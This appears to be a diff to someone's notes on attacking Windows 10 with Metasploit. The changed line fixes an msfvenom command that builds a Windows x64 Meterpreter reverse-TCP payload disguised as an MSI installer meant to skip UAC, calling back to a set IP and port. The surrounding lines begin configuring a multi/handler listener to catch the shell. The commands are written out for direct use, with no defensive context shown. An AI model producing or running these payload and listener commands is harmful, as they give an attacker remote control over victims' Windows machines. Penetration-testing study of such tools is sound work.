@@ -41,7 +41,7 @@ for windows 10 ::::
 
 # msfvenom -l formats
 
-# msfvenom -p windows/meterpreter/reverse_tcp LHOST=192.168.0.132 LPORT=3344 msi-nouac /root/Desktop/amit.msi
+# msfvenom -p windows/x64/meterpreter/reverse_tcp LHOST=192.168.0.132 LPORT=3344 -f msi-nouac -o /root/Desktop/amit.msi
 
 Run a multi hander and run job for differnet Port :
 #msf > use exploit/multi/handler : for running the handler 
